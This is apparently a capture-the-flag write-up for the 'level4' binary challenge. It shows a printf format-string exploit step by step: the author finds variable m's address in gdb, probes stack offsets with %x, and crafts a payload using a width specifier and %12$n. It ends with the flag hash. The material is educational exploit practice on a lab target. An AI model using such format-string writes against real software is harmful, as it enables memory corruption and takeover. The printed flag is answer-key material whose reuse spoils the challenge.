### Download binary
``scp -P4242 level4@192.168.31.170:/home/user/level4/level4 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)
This one is almost exactly like the previous one, the only few things that change are
-The value that we must put in m is too large for the buffer (16930116 in decimal, and we can only write about 520 char)
-The pointer that point to the beginning of our string is rank 12 on the stack (instead of 4)

----

### Building the payload

We need this payload :

**M ADRESS + FILLING CHAR + MEMORY ADRESS OF M IN STACK + %n**

``gdb ./level4``

**Searching for m adress :**
``(gdb) info variables``
>All defined variables:
[...]
0x08049810  m

**Searching for the stack adress of our input :**
``python -c "print 'AAAA' + ' %x ' * 12" | ./level4``
>AAAA b7ff26b0  bffff784  b7fd0ff4  0  0  bffff748  804848d  bffff540  200  b7fd1ac0  b7ff37d0  41414141  20782520  20782520

-> **12th place**.

This time, we don't have enough space in buffer to store the number of char we need. So we gonna use a printf format option.
The width specifier is denoted by a number that specifies the minimum number of characters to be printed. If the printed value has fewer characters than the specified width, it will be padded with spaces on the left by default.

This is our final payload:
``python -c "print '\x10\x98\x04\x08' + '%16930112u' + '%12\$n'" > /tmp/payload``

----

#### Getting the flag

``cat /tmp/payload | ./level4``

>[a lot of spaces]
3086952112
**0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a**
